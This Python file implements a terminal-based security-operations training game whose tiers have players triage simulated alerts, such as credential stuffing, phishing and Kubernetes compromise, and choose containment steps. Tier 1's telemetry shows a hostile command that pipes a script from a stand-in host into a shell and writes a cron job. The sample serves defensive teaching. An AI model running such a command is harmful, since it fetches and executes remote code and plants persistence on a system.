#!/usr/bin/env python3
"""
Wolf-SOC Cyber Academy — 6-Tier Story & Boss Campaign.
Uses shared ui_core + synth_engine for synced 72-col cards, Wolf mascot, and 8-bit audio.
"""

from __future__ import annotations

import hashlib
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

from domain_modules import DOMAIN_MODULES
from synth_engine import BackgroundBeat, play_sfx as synth_play_sfx
import ui_core as ui

BASE_DIR = Path(__file__).resolve().parent
ARTIFACTS_DIR = (BASE_DIR.parent if BASE_DIR.name == "shifts" else BASE_DIR) / "artifacts"
PROGRESS_PATH = ARTIFACTS_DIR / "academy_progress.json"

RST, BOLD, DIM = ui.RST, ui.BOLD, ui.DIM
CYAN, PINK, MINT, GOLD, RED, PURP = ui.CYAN, ui.PINK, ui.MINT, ui.GOLD, ui.RED, ui.PURP

# Re-exported module-level hooks (patchable by unit tests)
getch = ui.getch
clear = ui.clear
bar = ui.pct_bar

LESSONS = [
    {
        "tier": 1,
        "rank": "Signal Reader",
        "goal": "Spot false positives vs. credential stuffing & RCE.",
        "steps": [
            {
                "title": "Step 1/3 · Lunch Rush vs. Attack",
                "sensor": "WAF-EDGE  |  192.0.2.15  |  POST /api/v1/checkout",
                "telemetry": "1,900/min  |  HTTP 200: 99.2%  |  valid_pos_key_store_412",
                "coach": "Valid POS key + 99% HTTP 200 = busy lunch rush, not an attack!",
                "options": [
                    ("1", "Benign lunch rush — leave traffic untouched", True, "Clean call! Blocking valid 200 OK POS traffic takes a store offline."),
                    ("2", "Block 192.0.2.15 immediately at the firewall", False, "Check auth_header + HTTP 200 — you just blocked a paying store!"),
                ],
            },
            {
                "title": "Step 2/3 · Credential Stuffing",
                "sensor": "WAF-EDGE  |  198.51.100.44  |  POST /api/v1/checkout",
                "telemetry": "2,800/min  |  HTTP 401: 98%  |  auth_header: invalid",
                "coach": "98% HTTP 401 from one IP = automated login guessing at the edge.",
                "options": [
                    ("1", "Rate-limit / block 198.51.100.44 at the WAF", True, "Clean edge block! Zero impact on legitimate stores."),
                    ("2", "Wipe the production database", False, "Way too destructive — the noise is still outside the perimeter."),
                ],
            },
            {
                "title": "Step 3/3 · Container RCE Persistence",
                "sensor": "EDR-K8S   |  host: order-worker-02",
                "telemetry": "curl -s http://203.0.113.99/update.sh | sh -> /etc/cron.d/telemetry-sync",
                "coach": "Worker pods should NEVER curl scripts or write /etc/cron.d!",
                "options": [
                    ("1", "Deny-all NetworkPolicy + SHA-256 snapshot first", True, "Textbook containment! C2 cut off and custody preserved."),
                    ("2", "Ignore — probably an auto-update", False, "Containers are immutable; curling shell scripts into cron is RCE."),
                ],
            },
        ],
    },
    {
        "tier": 2,
        "rank": "Phish Hunter",
        "goal": "Read SPF/DKIM/DMARC & stop lookalike links.",
        "steps": [
            {
                "title": "Step 1/2 · Lookalike Domain Trap",
                "sensor": "EMAIL-GW  |  From: support@retailpos-gateway.example  |  SPF/DMARC: FAIL",
                "telemetry": "Link: https://retailpos-gateway.example.login-auth-check.example/sso",
                "coach": "Read right before the first '/': real host is login-auth-check.example!",
                "options": [
                    ("1", "Purge org-wide, block domain, check proxy clickers", True, "Bullseye! Org-wide sweep protects every inbox."),
                    ("2", "Delete only from the reporter's mailbox", False, "If one person reported it, dozens more got the same phish."),
                ],
            },
            {
                "title": "Step 2/2 · Post-Click Containment",
                "sensor": "PROXY-LOG |  1 manager entered creds on login-auth-check.example",
                "telemetry": "SSO session issued 4m ago from 198.51.100.56",
                "coach": "A password reset alone does NOT kill an active stolen session token!",
                "options": [
                    ("1", "Revoke SSO tokens + reset pass/MFA + refresher", True, "Token revocation kicks the attacker out immediately!"),
                    ("2", "Ask user to change password next week", False, "The attacker already holds a live session token right now."),
                ],
            },
        ],
    },
    {
        "tier": 3,
        "rank": "Root-Cause Purge",
        "goal": "Break coupled respawn loops & lock down pods.",
        "steps": [
            {
                "title": "Step 1/2 · Break the Respawn Loop",
                "sensor": "K8S-AUDIT |  order-worker-02 hit via unauth /debug/exec",
                "telemetry": "Mounted SA token has cluster-read; cron returns 60s after delete",
                "coach": "Deleting cron alone fails if stolen tokens & /debug/exec stay open.",
                "options": [
                    ("1", "Kill proc + wipe cron + rotate tokens + close /debug/exec", True, "Coupled root cause closed! Zero respawn."),
                    ("2", "Delete cron file and restart the container", False, "Respawn trap! Attacker re-enters through /debug/exec."),
                ],
            },
            {
                "title": "Step 2/2 · Immutable Pod Hardening",
                "sensor": "K8S-DEPLOY |  PCI DSS / SOC 2 hardened manifest",
                "telemetry": "Goal: block disk writes + remove unneeded K8s API creds",
                "coach": "Lock rootfs read-only and turn off default SA token automount.",
                "options": [
                    ("1", "readOnlyRootFilesystem: true + automountServiceAccountToken: false", True, "Immutable runtime locked! Cron writes are physically blocked."),
                    ("2", "Scale deployment from 2 replicas to 6", False, "More replicas just gives the attacker 6 targets instead of 2."),
                ],
            },
        ],
    },
    {
        "tier": 4,
        "rank": "Blind Boss Shift",
        "goal": "Zero hints. Triage a correlated breach cleanly.",
        "steps": [
            {
                "title": "Boss 1/2 · Burst + Internal Exfil",
                "sensor": "[A] 3,100/m 200 OK store_108  |  [B] db-backup -> 203.0.113.104:443 (2.4 GB)",
                "telemetry": "db-backup never talks externally; store_108 is a stadium kiosk",
                "coach": "",
                "options": [
                    ("1", "Keep store_108 up; isolate db-backup, hash snapshot, rotate DB creds", True, "Flawless triage! Zero outage and exfil stopped cold."),
                    ("2", "Block both IPs and reboot the database cluster", False, "You downed a stadium kiosk and wiped volatile memory evidence."),
                ],
            },
            {
                "title": "Boss 2/2 · Audit & Custody Closure",
                "sensor": "COMPLIANCE |  PCI DSS / SOC 2 Post-Mortem",
                "telemetry": "Auditor asks how you proved integrity & prevented recurrence",
                "coach": "",
                "options": [
                    ("1", "Show SHA-256 hashes + timeline + NetworkPolicy & PSS Restricted diff", True, "Master certified! Exact chain-of-custody proof SOC & AppSec teams expect."),
                    ("2", "Say logs were deleted during cleanup", False, "Destroying evidence fails chain-of-custody immediately."),
                ],
            },
        ],
    },
]

LESSONS.extend(DOMAIN_MODULES)

WOLF_QUIPS = {
    "idle": "Ears perked on the wire — ready!",
    "happy": "*happy 8-bit howl* Clean call!",
    "sad": "*sad beep* Trap tripped — check the clue!",
    "hype": "RANK UNLOCKED! Pack leader status.",
}


def load_progress() -> set[int]:
    if PROGRESS_PATH.exists():
        try:
            data = json.loads(PROGRESS_PATH.read_text(encoding="utf-8"))
            return set(data.get("completed_tiers", []))
        except Exception:
            pass
    return set()


def save_progress(completed: set[int]) -> None:
    ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)
    PROGRESS_PATH.write_text(
        json.dumps({"completed_tiers": sorted(completed), "updated_utc": datetime.now(timezone.utc).isoformat()}, indent=2),
        encoding="utf-8",
    )


def render_top(
    title: str,
    right_tag: str,
    mood: str,
    muted: bool,
    bgm: BackgroundBeat | None = None,
    quip: str | None = None,
) -> None:
    clear()
    ui.header(f"WOLF ACADEMY · {title}", badge=right_tag, muted=muted, bgm=bgm)
    line1 = f"{BOLD}{title}{RST}"
    line2 = f"{DIM}{quip or WOLF_QUIPS.get(mood, WOLF_QUIPS['idle'])}{RST}"
    ui.wolf_say(mood, line1, line2)
    print()


def play_lesson(
    lesson: dict,
    completed: set[int],
    muted: bool,
    bgm: BackgroundBeat | None = None,
) -> bool:
    mood = "idle"
    total_steps = len(lesson["steps"])

    for idx, step in enumerate(lesson["steps"], 1):
        while True:
            render_top(lesson["rank"], f"{idx}/{total_steps}", mood, muted, bgm)
            ui.panel(
                step["title"],
                [
                    f"{BOLD}{step['sensor']}{RST}",
                    step["telemetry"],
                ],
                color=CYAN,
            )
            if step["coach"]:
                print(f"  {PINK}Tip:{RST} {step['coach']}\n")
            else:
                print(f"  {RED}BLIND MODE:{RST} {DIM}No hints — trust the telemetry.{RST}\n")

            for key, label, _, _ in step["options"]:
                color = MINT if key == "1" else GOLD
                print(f"    {color}[{key}]{RST} {label}")

            ui.footer([("1-2", "Pick"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])

            ch = getch().lower()
            if ch == "m":
                muted = ui.toggle_mute(muted, bgm)
                continue
            if ch == "v":
                muted = ui.cycle_vibe(muted, bgm)
                synth_play_sfx("blip", muted)
                continue
            if ch in {"b", "q"}:
                return muted

            matched = [opt for opt in step["options"] if opt[0] == ch]
            if not matched:
                continue

            _, _, is_ok, feedback = matched[0]
            if is_ok:
                mood = "happy"
                synth_play_sfx("good", muted)
                render_top(lesson["rank"], f"{idx}/{total_steps}", mood, muted, bgm)
                ui.panel("CLEAN CALL", [f"{MINT}{BOLD}✔ {feedback}{RST}"], color=MINT)
                print(f"\n  {DIM}Press any key for next step...{RST}")
                getch()
                break
            else:
                mood = "sad"
                synth_play_sfx("bad", muted)
                render_top(lesson["rank"], f"{idx}/{total_steps}", mood, muted, bgm)
                ui.panel("TRAP TRIPPED", [f"{RED}{BOLD}✘ {feedback}{RST}"], color=RED)
                print(f"\n  {GOLD}Press any key to retry...{RST}")
                getch()

    completed.add(lesson["tier"])
    save_progress(completed)
    synth_play_sfx("fanfare", muted)
    pct = int(round(100 * len(completed) / len(LESSONS)))
    render_top(lesson["rank"], "CLEAR!", "hype", muted, bgm)

    lines = [
        f"{MINT}{BOLD}★ Tier {lesson['tier']} Complete — {lesson['rank']}{RST}",
        f"Mastery: {ui.bar(len(completed), len(LESSONS), 20, GOLD if pct == 100 else MINT)}",
    ]
    if pct == 100:
        digest = hashlib.sha256(f"WOLF-SOC-MASTER-{datetime.now(timezone.utc).date()}".encode()).hexdigest()
        lines.append(f"{GOLD}{BOLD}All {len(LESSONS)} Tiers Mastered!{RST}  Seal: {PINK}{digest[:18]}…{RST}")
    else:
        next_tier = min(set(range(1, len(LESSONS) + 1)) - completed)
        lines.append(f"Next up: Tier [{next_tier}]")
    ui.panel("TIER CLEARED", lines, color=GOLD if pct == 100 else MINT)
    print(f"\n  {DIM}Press any key to return...{RST}")
    getch()
    return muted


def run_menu(muted: bool = False, bgm: BackgroundBeat | None = None) -> bool:
    completed = load_progress()
    mood = "hype" if len(completed) == len(LESSONS) else "idle"

    while True:
        pct = int(round(100 * len(completed) / len(LESSONS)))
        render_top(
            "Campaign Map",
            f"{len(completed)}/{len(LESSONS)}",
            mood,
            muted,
            bgm,
            quip=f"Progress: {ui.bar(len(completed), len(LESSONS), 16, GOLD if pct == 100 else MINT)}",
        )

        for l in LESSONS:
            done = l["tier"] in completed
            mark = f"{MINT}✔{RST}" if done else f"{GOLD}●{RST}"
            rank = ui.truncate_vis(l["rank"], 22)
            goal = ui.truncate_vis(l["goal"], 38)
            print(f"  {CYAN}[{l['tier']}]{RST} {mark} {BOLD}{ui.pad_vis(rank, 22)}{RST} {DIM}{goal}{RST}")

        ui.footer([("1-6", "Play"), ("T", "SFX"), ("V", "Vibe"), ("M", "Mute"), ("B", "Back")])
        ch = getch().lower()
        if ch in {"b", "q"}:
            return muted
        elif ch == "m":
            muted = ui.toggle_mute(muted, bgm)
        elif ch == "v":
            muted = ui.cycle_vibe(muted, bgm)
            synth_play_sfx("blip", muted)
        elif ch == "t":
            synth_play_sfx("good", muted)
            mood = "happy"
        elif ch in {str(l["tier"]) for l in LESSONS}:
            synth_play_sfx("blip", muted)
            tier_obj = next(x for x in LESSONS if str(x["tier"]) == ch)
            muted = play_lesson(tier_obj, completed, muted, bgm)
            mood = "hype" if len(completed) == len(LESSONS) else "happy"


def main() -> None:
    run_menu(muted=False, bgm=None)


if __name__ == "__main__":
    bgm = BackgroundBeat()
    bgm.start()
    sys.stdout.write("\033[?1049h\033[?25l")
    sys.stdout.flush()
    try:
        run_menu(muted=False, bgm=bgm)
    finally:
        bgm.stop()
        sys.stdout.write("\033[?25h\033[?1049l")
        sys.stdout.flush()
